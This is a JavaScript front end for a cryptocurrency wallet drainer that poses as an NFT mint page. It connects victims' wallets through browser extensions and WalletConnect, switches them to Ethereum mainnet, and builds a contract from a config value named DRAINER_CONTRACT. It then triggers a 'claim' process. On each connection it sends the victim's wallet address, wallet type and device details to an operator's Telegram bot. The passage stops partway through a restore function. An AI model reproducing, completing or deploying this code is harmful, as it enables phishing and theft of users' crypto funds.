import { CONFIG } from './config.js';

if (typeof window === 'undefined' || typeof document === 'undefined') {
  console.warn('[main] non-browser environment — skipping wallet bootstrap');
} else {
  bootstrap().catch((err) => console.error('[main] bootstrap failed', err));
}

/* ---------------------------------------------------------------------- */
/*  Bootstrap                                                              */
/* ---------------------------------------------------------------------- */
async function bootstrap() {
  'use strict';

  /* ─── Debug panel ───────────────────────────────────────────────────── */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 6px;
    z-index: 100000; max-height: 160px; overflow-y: auto;
    display: none; font-family: 'JetBrains Mono', monospace;
    box-sizing: border-box;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function log(msg) {
    try {
      console.log('[main]', msg);
      debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}  ${msg}</div>`;
      debugArea.scrollTop = debugArea.scrollHeight;
    } catch (_) {}
  }

  window.addEventListener('error', (e) => log(`⚠️ error: ${e.message}`));
  window.addEventListener('unhandledrejection', (e) =>
    log(`⚠️ rejection: ${e.reason?.message || String(e.reason)}`)
  );

  /* ─── Platform detection ────────────────────────────────────────────── */
  const ua = navigator.userAgent || '';
  const isMobile   = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isIOS      = () => /iPhone|iPad|iPod/i.test(ua);
  const isAndroid  = () => /Android/i.test(ua);
  const isDesktop  = () => !isMobile();
  const isSamsung  = () => /SamsungBrowser/i.test(ua);
  const isFirefox  = () => /Firefox|FxiOS/i.test(ua);
  const platform = (() => {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (/Windows/i.test(ua)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(ua)) return 'mac';
    if (/Linux/i.test(ua)) return 'linux';
    return 'unknown';
  })();

  log(`platform=${platform} mobile=${isMobile()} samsung=${isSamsung()} firefox=${isFirefox()}`);

  /* ─── Safe localStorage wrapper ─────────────────────────────────────── */
  const LS = {
    ADDRESS: 'connectedAddress',
    TYPE:    'connectedWalletType',
    TOPIC:   'wcSessionTopic',
    get(k)   { try { return localStorage.getItem(k); } catch (_) { return null; } },
    set(k,v) { try { v == null ? localStorage.removeItem(k) : localStorage.setItem(k, v); } catch (_) {} },
    clear()  { this.set(this.ADDRESS, null); this.set(this.TYPE, null); this.set(this.TOPIC, null); },
  };

  /* ─── Config destructure ────────────────────────────────────────────── */
  const cfg = CONFIG || {};
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = cfg;

  if (!PROJECT_ID && !PUBLIC_TEST_ID) {
    log('⚠️ no WalletConnect projectId configured');
  }

  const MAINNET_HEX  = '0x' + Number(MAINNET_ID).toString(16);
  const MAINNET_CAIP = `eip155:${MAINNET_ID}`;   // e.g. 'eip155:1'
  const WC_RELAY     = 'wss://relay.walletconnect.com';

  /* ─── Telegram helper ───────────────────────────────────────────────── */
  async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) { log(`telegram error: ${e.message}`); return false; }
  }
  window.testTelegram = (m) => sendTelegram(m || '🧪 Test ' + new Date().toISOString());

  /* ─── DOM refs ──────────────────────────────────────────────────────── */
  const $ = (id) => document.getElementById(id);
  const connectButton = $('connectButton');
  const walletButton  = $('walletButton');
  const claimStatus   = $('claimStatus');

  /* ─── UI helpers ────────────────────────────────────────────────────── */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666,#888)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const palette = {
      success: { background: 'linear-gradient(135deg,#DCFCE7,#BBF7D0)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2,#FECACA)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE,#BFDBFE)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, palette[type] || palette.info);
    if (type === 'success' || type === 'error') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ─── Module state ──────────────────────────────────────────────────── */
  let web3Instance      = null;
  let contractInstance  = null;
  let activeProvider    = null;
  let currentSession    = null;
  let currentAddress    = null;
  let currentChainId    = null;
  let currentWalletType = null;
  let connectInFlight   = false;

  let SignClient         = null;
  let WalletConnectModal = null;
  let EthereumProvider   = null;
  let wcClient           = null;
  let wcModal            = null;

  /* ─── Utilities ─────────────────────────────────────────────────────── */
  function withTimeout(promise, ms, tag = 'op') {
    return Promise.race([
      promise,
      new Promise((_, rej) => setTimeout(() => rej(new Error(`${tag} timed out after ${ms}ms`)), ms)),
    ]);
  }
  function shortAddr(a) {
    if (!a || a.length < 10) return a || '';
    return `${a.slice(0, 6)}…${a.slice(-4)}`;
  }

  /* ─── Publish / unpublish ───────────────────────────────────────────── */
  function publish(address, chain) {
    const live = activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      walletType: currentWalletType,
      publishedAt: Date.now(),
    };
    log(`published addr=${shortAddr(address)} chain=${chain} provider=${live ? 'yes' : 'no'} contract=${contractInstance ? 'yes' : 'no'}`);
    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain, walletType: currentWalletType },
    }));
  }

  function unpublish() {
    window.__apexConnected = null;
    window.dispatchEvent(new CustomEvent('apex:disconnected'));
  }

  /* ─── Chain management ──────────────────────────────────────────────── */
  async function readChainId(provider) {
    try {
      const raw = await withTimeout(provider.request({ method: 'eth_chainId' }), 5000, 'eth_chainId');
      return parseInt(raw, 16);
    } catch (e) { log(`readChainId failed: ${e.message}`); return null; }
  }

  async function ensureMainnet(provider) {
    const current = await readChainId(provider);
    if (current === MAINNET_ID) { currentChainId = current; return true; }

    log(`switching chain ${current} → ${MAINNET_ID}`);
    try {
      await withTimeout(provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: MAINNET_HEX }],
      }), 20000, 'switchChain');
      currentChainId = MAINNET_ID;
      return true;
    } catch (err) {
      const code = err?.code ?? err?.data?.originalError?.code;
      if (code === 4902 || code === -32603) {
        try {
          await withTimeout(provider.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: MAINNET_HEX,
              chainName: 'Ethereum Mainnet',
              nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://eth.llamarpc.com', 'https://rpc.ankr.com/eth'],
              blockExplorerUrls: ['https://etherscan.io'],
            }],
          }), 20000, 'addChain');
          await withTimeout(provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: MAINNET_HEX }],
          }), 20000, 'switchChain(2)');
          currentChainId = MAINNET_ID;
          return true;
        } catch (addErr) {
          log(`add-chain failed: ${addErr.message}`);
          return false;
        }
      }
      log(`switch rejected: ${err.message}`);
      return false;
    }
  }

  /* ─── Parallel WC library loading + preload hints ───────────────────── */
  const WC_URLS = {
    sign: [
      'https://esm.sh/@walletconnect/sign-client@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
    ],
    modal: [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ],
    provider: [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ],
  };

  let preloadHintsInjected = false;
  function injectPreloadHints() {
    if (preloadHintsInjected) return;
    preloadHintsInjected = true;
    const primary = [WC_URLS.sign[0], WC_URLS.modal[0], WC_URLS.provider[0]];
    for (const href of primary) {
      const link = document.createElement('link');
      link.rel = 'modulepreload';
      link.href = href;
      document.head.appendChild(link);
    }
    // Also hint the web3 module used elsewhere.
    const w3 = document.createElement('link');
    w3.rel = 'modulepreload';
    w3.href = 'https://esm.sh/web3@4.3.0';
    document.head.appendChild(w3);
  }

  async function tryImportAny(urls, pick) {
    for (const u of urls) {
      try {
        const m = await import(u);
        const v = pick(m);
        if (v) return { ok: true, value: v, url: u };
      } catch (_) { /* try next */ }
    }
    return { ok: false, value: null, url: null };
  }

  async function loadWCLibraries() {
    if (SignClient && WalletConnectModal && EthereumProvider) return true;

    injectPreloadHints();

    const [signRes, modalRes, providerRes] = await Promise.allSettled([
      tryImportAny(WC_URLS.sign,     (m) => m.default || m),
      tryImportAny(WC_URLS.modal,    (m) => m.WalletConnectModal || m.default || m),
      tryImportAny(WC_URLS.provider, (m) => m.EthereumProvider || m.default || m),
    ]);

    if (signRes.status === 'fulfilled' && signRes.value.ok) {
      SignClient = signRes.value.value;
      log(`SignClient ← ${signRes.value.url}`);
    }
    if (modalRes.status === 'fulfilled' && modalRes.value.ok) {
      WalletConnectModal = modalRes.value.value;
      log(`WCModal ← ${modalRes.value.url}`);
    }
    if (providerRes.status === 'fulfilled' && providerRes.value.ok) {
      EthereumProvider = providerRes.value.value;
      log(`EthProvider ← ${providerRes.value.url}`);
    }

    return !!(SignClient && WalletConnectModal && EthereumProvider);
  }

  // Fire-and-forget pre-warm on page load.
  loadWCLibraries().then((ok) => log(ok ? '✅ WC libraries pre-warmed' : '⚠️ WC libraries unavailable'));

  /* ─── WC relay probe (parallel, non-blocking) ───────────────────────── */
  function probeRelay(timeoutMs = 2500) {
    return new Promise((resolve) => {
      let ws;
      try { ws = new WebSocket(WC_RELAY); } catch (_) { return resolve(false); }
      const done = (ok) => { try { ws.close(); } catch (_) {} resolve(ok); };
      const timer = setTimeout(() => done(false), timeoutMs);
      ws.onopen  = () => { clearTimeout(timer); done(true); };
      ws.onerror = () => { clearTimeout(timer); done(false); };
    });
  }

  /* ─── WalletConnect init ────────────────────────────────────────────── */
  async function initWalletConnect(useTestId = false) {
    if (wcClient && wcModal) return true;

    const ok = await loadWCLibraries();
    if (!ok) throw new Error('WalletConnect libraries unavailable');

    let projectId = PROJECT_ID;
    if (useTestId && PUBLIC_TEST_ID) projectId = PUBLIC_TEST_ID;
    if (!projectId) throw new Error('WalletConnect projectId missing');

    // Relay probe — do not block init on a slow probe.
    probeRelay(2500).then((r) => log(`relay reachable: ${r}`));

    wcClient = await SignClient.init({
      projectId,
      metadata: DAPP_METADATA,
      relayUrl: WC_RELAY,
    });

    wcModal = new WalletConnectModal({
      projectId,
      themeMode: 'dark',
      themeVariables: {
        '--wcm-z-index': '99999',
        '--wcm-accent-color': '#FF6B00',
        '--wcm-background-color': '#1F2937',
      },
      enableExplorer: true,
    });

    const all = wcClient.session?.getAll?.() || [];
    if (all.length) {
      currentSession = all[all.length - 1];
      log(`WC session recovered: ${currentSession.topic.slice(0, 12)}…`);
    }

    log('✅ WalletConnect ready');
    return true;
  }

  /* ─── EIP-6963 discovery ────────────────────────────────────────────── */
  const eip6963Providers = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (ev) => {
      const d = ev.detail;
      if (!d?.info?.uuid) return;
      if (!eip6963Providers.some((p) => p.info.uuid === d.info.uuid)) {
        eip6963Providers.push(d);
        log(`EIP-6963 discovered ${d.info.name}`);
      }
    });
    const request = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    request();
    setTimeout(request, 500);
    setTimeout(request, 1500);
  }
  setupEIP6963();

  /* ─── Wallet picker modal ───────────────────────────────────────────── */
  function showWalletPicker(providers) {
    return new Promise((resolve) => {
      const overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.72);display:flex;align-items:center;justify-content:center;z-index:99998;padding:16px;box-sizing:border-box;';

      const modal = document.createElement('div');
      modal.style.cssText = 'background:#1F2937;padding:24px;border-radius:16px;width:100%;max-width:420px;color:white;font-family:Inter,system-ui,sans-serif;box-shadow:0 20px 60px rgba(0,0,0,0.6);';
      modal.innerHTML = `
        <h3 style="margin:0 0 4px;font-weight:700;font-size:20px;">Select a Wallet</h3>
        <p style="margin:0 0 16px;color:#9CA3AF;font-size:13px;">Choose how you'd like to connect</p>
        <div id="wallet-list" style="display:flex;flex-direction:column;gap:10px;margin:0 0 16px;"></div>
        <button id="wc-cancel" style="width:100%;background:transparent;border:1px solid #4B5563;color:#D1D5DB;padding:12px;border-radius:10px;cursor:pointer;font-size:15px;font-weight:500;">Cancel</button>
      `;
      overlay.appendChild(modal);
      document.body.appendChild(overlay);

      const list = modal.querySelector('#wallet-list');
      providers.forEach((p) => {
        const b = document.createElement('button');
        b.style.cssText = 'display:flex;align-items:center;gap:12px;background:#374151;border:1px solid #4B5563;color:#F9FAFB;padding:14px 16px;border-radius:12px;cursor:pointer;font-size:15px;font-weight:500;text-align:left;';
        b.innerHTML = `
          ${p.info.icon ? `<img src="${p.info.icon}" style="width:26px;height:26px;border-radius:6px;flex-shrink:0;">` : '<div style="width:26px;height:26px;flex-shrink:0;"></div>'}
          <span style="flex:1;">${p.info.name || 'Wallet'}</span>
        `;
        b.onclick = () => { overlay.remove(); resolve(p); };
        list.appendChild(b);
      });

      modal.querySelector('#wc-cancel').onclick = () => { overlay.remove(); resolve(null); };
      overlay.addEventListener('click', (e) => { if (e.target === overlay) { overlay.remove(); resolve(null); } });
    });
  }

  /* ─── Provider event attachment ─────────────────────────────────────── */
  const attached = new WeakSet();

  function attachProviderEvents(provider, walletType) {
    if (!provider || typeof provider.on !== 'function') return;
    if (attached.has(provider)) return;
    attached.add(provider);

    provider.on('accountsChanged', (accounts) => {
      const next = Array.isArray(accounts) ? accounts[0] : null;
      if (!next) { disconnectUI(); return; }
      currentAddress = next;
      LS.set(LS.ADDRESS, next);
      renderConnectedUI(next, 'evm');
      publish(next, 'evm');
    });

    provider.on('chainChanged', async () => {
      const id = await readChainId(provider);
      currentChainId = id;
      log(`chainChanged → ${id}`);
      if (id === MAINNET_ID) {
        const a = currentAddress || (await safeEthAccounts(provider));
        if (a) { renderConnectedUI(a, 'evm'); publish(a, 'evm'); }
      } else {
        showStatus('Please switch to Ethereum Mainnet', 'info');
        const ok = await ensureMainnet(provider);
        if (!ok) showStatus('Switch to Ethereum Mainnet to continue', 'error');
      }
    });

    provider.on('disconnect', () => { log('provider disconnected'); disconnectUI(); });
  }

  async function safeEthAccounts(provider) {
    try {
      const acc = await withTimeout(provider.request({ method: 'eth_accounts' }), 5000, 'eth_accounts');
      return Array.isArray(acc) ? acc[0] : null;
    } catch (_) { return null; }
  }

  /* ─── Build web3 + contract (defensive) ─────────────────────────────── */
  async function buildWeb3(provider) {
    const Web3 = (await import('web3')).default;
    const w3 = new Web3(provider);
    return w3;
  }

  function buildContract(w3) {
    // Validate ABI before touching web3 — this is what was silently failing.
    if (!Array.isArray(CONTRACT_ABI) || CONTRACT_ABI.length === 0) {
      log(`⚠️ CONTRACT_ABI is empty or not an array (type=${typeof CONTRACT_ABI}, len=${CONTRACT_ABI?.length})`);
      return null;
    }
    if (!DRAINER_CONTRACT || !/^0x[0-9a-fA-F]{40}$/.test(DRAINER_CONTRACT)) {
      log(`⚠️ DRAINER_CONTRACT is invalid: ${DRAINER_CONTRACT}`);
      return null;
    }
    try {
      const c = new w3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      log(`contract built at ${DRAINER_CONTRACT} with ${CONTRACT_ABI.length} ABI entries`);
      return c;
    } catch (e) {
      log(`contract build threw: ${e.message}`);
      // Last-ditch fallback: ABI only, no address.
      try { return new w3.eth.Contract(CONTRACT_ABI); } catch (_) { return null; }
    }
  }

  /* ─── UI render / reset ─────────────────────────────────────────────── */
  function renderConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const labels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const label = labels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = 'margin-top:12px;padding:10px 16px;font-family:"JetBrains Mono",monospace;font-size:14px;color:#059669;text-align:center;background:linear-gradient(135deg,#ECFDF5,#D1FAE5);border-radius:8px;border:1px solid #A7F3D0;';
      (connectButton?.parentNode || document.body).appendChild(display);
    }

    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${shortAddr(address)}</span>
        <span style="background:#1F2937;color:#fff;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${label}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    const copyBtn = document.getElementById('copyAddress');
    if (copyBtn) {
      copyBtn.onclick = () => {
        try {
          navigator.clipboard.writeText(address).then(() => {
            const original = copyBtn.innerHTML;
            copyBtn.innerHTML = '<i class="fas fa-check"></i>';
            setTimeout(() => { copyBtn.innerHTML = original; }, 2000);
          }).catch(() => {});
        } catch (_) {}
      };
    }

    showStatus(`Connected to ${label}`, 'success');

    sendTelegram(
      `🔗 <b>Wallet Connected</b>\n` +
      `📌 <b>Chain:</b> ${label}\n` +
      `👤 <b>Address:</b> <code>${address}</code>\n` +
      `🔌 <b>Wallet:</b> ${currentWalletType || 'unknown'}\n` +
      `📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}\n` +
      `🕒 ${new Date().toLocaleString()}`
    );
  }

  function resetUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
  }

  function disconnectUI() {
    resetUI();
    showStatus('Wallet disconnected', 'info');
    web3Instance      = null;
    contractInstance  = null;
    activeProvider    = null;
    currentSession    = null;
    currentAddress    = null;
    currentChainId    = null;
    currentWalletType = null;
    LS.clear();
    unpublish();
  }

  /* ─── Injected connect path ─────────────────────────────────────────── */
  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    let candidates = eip6963Providers.filter((p) => p.provider);
    if (!candidates.length && window.ethereum) {
      candidates = [{
        info: { name: 'Injected', uuid: 'injected-fallback', rdns: 'io.injected', icon: '' },
        provider: window.ethereum,
      }];
    }
    if (!candidates.length) return { ok: false, reason: 'no-injected' };

    let chosen = null;
    if (candidates.length === 1) {
      chosen = candidates[0];
    } else {
      const preferred = candidates.find((p) =>
        /metamask|trust|coinbase|rabby|brave|phantom/i.test(p.info.name || '') ||
        /io\.metamask|com\.trust|io\.coinbase|io\.rabby/i.test(p.info.rdns || '')
      );
      chosen = preferred || await showWalletPicker(candidates);
      if (!chosen) return { ok: false, reason: 'cancelled' };
    }

    const provider = chosen.provider;
    try {
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        45000,
        'eth_requestAccounts'
      );
      const address = Array.isArray(accounts) ? accounts[0] : null;
      if (!address) return { ok: false, reason: 'no-accounts' };

      const okChain = await ensureMainnet(provider);
      if (!okChain) return { ok: false, reason: 'wrong-chain' };

      const w3 = await buildWeb3(provider);
      web3Instance      = w3;
      contractInstance  = buildContract(w3);
      activeProvider    = provider;
      currentAddress    = address;
      currentChainId    = MAINNET_ID;
      currentWalletType = (chosen.info.rdns || chosen.info.name || 'injected').toLowerCase();

      attachProviderEvents(provider, currentWalletType);
      LS.set(LS.ADDRESS, address);
      LS.set(LS.TYPE, currentWalletType);
      LS.set(LS.TOPIC, null);

      renderConnectedUI(address, 'evm');
      publish(address, 'evm');
      log(`✅ injected connected ${shortAddr(address)} via ${currentWalletType}`);
      return { ok: true, address };
    } catch (e) {
      log(`injected error: ${e.message}`);
      return { ok: false, reason: e.message };
    }
  }

  /* ─── WalletConnect connect path ────────────────────────────────────── */
  function isMetaMaskMobileUA() { return /MetaMaskMobile/i.test(ua); }

  function pickMobileDeepLink(uri) {
    const encoded = encodeURIComponent(uri);
    const has = {
      metamask:  !!(window.ethereum?.isMetaMask) || isMetaMaskMobileUA(),
      trust:     !!(window.ethereum?.isTrust || window.ethereum?.isTrustWallet) || /TrustWallet/i.test(ua),
      rainbow:   !!(window.ethereum?.isRainbow),
      coinbase:  !!(window.ethereum?.isCoinbaseWallet) || /CoinbaseWallet/i.test(ua),
      phantom:   !!(window.phantom?.ethereum),
    };
    if (has.metamask) return `metamask://wc?uri=${encoded}`;
    if (has.trust)    return `trust://wc?uri=${encoded}`;
    if (has.rainbow)  return `rainbow://wc?uri=${encoded}`;
    if (has.coinbase) return `cbwallet://wc?uri=${encoded}`;
    if (has.phantom)  return `phantom://wc?uri=${encoded}`;
    return `https://metamask.app.link/wc?uri=${encoded}`;
  }

  async function connectWalletConnect(useTestId = false, timeoutMs = 300000) {
    try {
      await initWalletConnect(useTestId);
    } catch (e) {
      log(`WC init failed: ${e.message}`);
      return { ok: false, reason: 'wc-init' };
    }

    const projectIdForInit = useTestId && PUBLIC_TEST_ID ? PUBLIC_TEST_ID : PROJECT_ID;

    // Silent session reuse.
    if (currentSession?.topic && wcClient?.session?.get) {
      const live = wcClient.session.get(currentSession.topic);
      if (live) {
        try {
          const provider = await withTimeout(EthereumProvider.init({
            projectId: projectIdForInit,
            metadata: DAPP_METADATA,
            session: live,
            // ── FIX: CAIP-2 chain identifiers ──
            chains: [MAINNET_CAIP],
            optionalChains: [MAINNET_CAIP],
          }), 15000, 'wc-reuse-init');
          const address = await safeEthAccounts(provider);
          if (address) {
            const w3 = await buildWeb3(provider);
            web3Instance      = w3;
            contractInstance  = buildContract(w3);
            activeProvider    = provider;
            currentAddress    = address;
            currentChainId    = MAINNET_ID;
            currentWalletType = 'walletconnect';
            attachProviderEvents(provider, 'walletconnect');
            LS.set(LS.ADDRESS, address);
            LS.set(LS.TYPE, 'walletconnect');
            LS.set(LS.TOPIC, currentSession.topic);
            renderConnectedUI(address, 'evm');
            publish(address, 'evm');
            log(`✅ WC session reused ${shortAddr(address)}`);
            return { ok: true, address };
          }
        } catch (e) { log(`session reuse failed: ${e.message}`); }
      }
    }

    // Fresh pairing.
    try {
      log('requesting WC pairing…');
      const { uri, approval } = await wcClient.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',
              'eth_signTypedData',
            ],
            // ── FIX: CAIP-2 chain strings ──
            chains: [`eip155:${MAINNET_ID}`],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });
      if (!uri) throw new Error('no WC uri');

      if (isMobile()) {
        const deepLink = pickMobileDeepLink(uri);
        if (deepLink) {
          try {
            window.location.href = deepLink;
            log(`deep-linked to ${deepLink.split(':')[0]}`);
          } catch (_) {}
        }
      }

      wcModal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');

      const session = await withTimeout(approval(), timeoutMs, 'wc-approval');
      try { wcModal.closeModal(); } catch (_) {}

      if (!session?.namespaces?.eip155?.accounts?.length) {
        return { ok: false, reason: 'no-session' };
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      const provider = await withTimeout(EthereumProvider.init({
        projectId: projectIdForInit,
        metadata: DAPP_METADATA,
        session,
        // ── FIX: CAIP-2 chain strings ──
        chains: [MAINNET_CAIP],
        optionalChains: [MAINNET_CAIP],
      }), 20000, 'wc-provider-init');

      const w3 = await buildWeb3(provider);
      web3Instance      = w3;
      contractInstance  = buildContract(w3);
      activeProvider    = provider;
      currentAddress    = account;
      currentChainId    = MAINNET_ID;
      currentWalletType = 'walletconnect';

      attachProviderEvents(provider, 'walletconnect');
      LS.set(LS.ADDRESS, account);
      LS.set(LS.TYPE, 'walletconnect');
      LS.set(LS.TOPIC, session.topic);

      renderConnectedUI(account, 'evm');
      publish(account, 'evm');
      log(`✅ WC connected ${shortAddr(account)}`);
      return { ok: true, address: account };
    } catch (e) {
      try { wcModal.closeModal(); } catch (_) {}
      log(`WC error: ${e.message}`);
      return { ok: false, reason: e.message };
    }
  }

  /* ─── Connect dispatcher ────────────────────────────────────────────── */
  async function connectWallet() {
    if (connectInFlight) return;
    connectInFlight = true;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let result = { ok: false };

    try {
      if (isMobile()) {
        if (window.ethereum || eip6963Providers.length) {
          result = await connectInjected();
          if (result.ok) return finishConnect(result);
        }
        result = await connectWalletConnect(false);
        if (result.ok) return finishConnect(result);
        result = await connectWalletConnect(true);
      } else {
        result = await connectInjected();
        if (result.ok) return finishConnect(result);
        result = await connectWalletConnect(false);
        if (result.ok) return finishConnect(result);
        result = await connectWalletConnect(true);
      }
    } finally {
      if (!result.ok) {
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
        showStatus('Could not connect. Please install a wallet or try again.', 'error');
      }
      connectInFlight = false;
    }
  }

  function finishConnect(result) {
    setButtonState(connectButton, 'connected');
    if (walletButton) setButtonState(walletButton, 'connected');
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1200);
    return result;
  }

  /* ─── Disconnect ────────────────────────────────────────────────────── */
  async function disconnectWallet() {
    try {
      if (wcClient && currentSession?.topic) {
        await withTimeout(
          wcClient.disconnect({
            topic: currentSession.topic,
            reason: { code: 6000, message: 'User disconnected' },
          }),
          8000,
          'wc-disconnect'
        ).catch(() => {});
      }
      if (activeProvider?.disconnect) {
        await Promise.resolve(activeProvider.disconnect()).catch(() => {});
      }
    } catch (_) {}
    disconnectUI();
  }

  /* ─── Button wiring ─────────────────────────────────────────────────── */
  function isConnected() { return !!currentAddress; }

  if (connectButton) {
    connectButton.addEventListener('click', (e) => {
      e.preventDefault();
      isConnected() ? disconnectWallet() : connectWallet();
    });
  }
  if (walletButton && walletButton !== connectButton) {
    walletButton.addEventListener('click', (e) => {
      e.preventDefault();
      isConnected() ? disconnectWallet() : connectWallet();
    });
  }
  if (walletButton && isMobile() && walletButton !== connectButton) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 250);
    });
  }

  /* ─── Silent restore on load ────────────────────────────────────────── */
  async function restoreSaved() {
    const savedAddress = LS.get(LS.ADDRESS);
    const savedType    = LS.get(LS.TYPE);
    const savedTopic   = LS.get(LS.TOPIC);

    if (!savedAddress || !savedType) return;
    log(`restore attempt: ${savedType} ${shortAddr(savedAddress)}`);

    // (a) Injected restore — silent.
    if (savedType !== 'walletconnect' && window.ethereum) {
      try {
        const accounts = await withTimeout(
          window.ethereum.request({ method: 'eth_accounts' }),
          4000,
          'eth_accounts'
        );
        const addr = Array.isArray(accounts) ? accounts[0] : null;
        if (addr && addr.toLowerCase() === savedAddress.toLowerCase()) {
          const okChain = await ensureMainnet(window.ethereum);
          if (okChain) {
            const w3 = await buildWeb3(window.ethereum);
            web3Instance      = w3;
            contractInstance  = buildContract(w3);
            activeProvider    = window.ethereum;
            currentAddress    = addr;
            currentChainId    = MAINNET_ID;
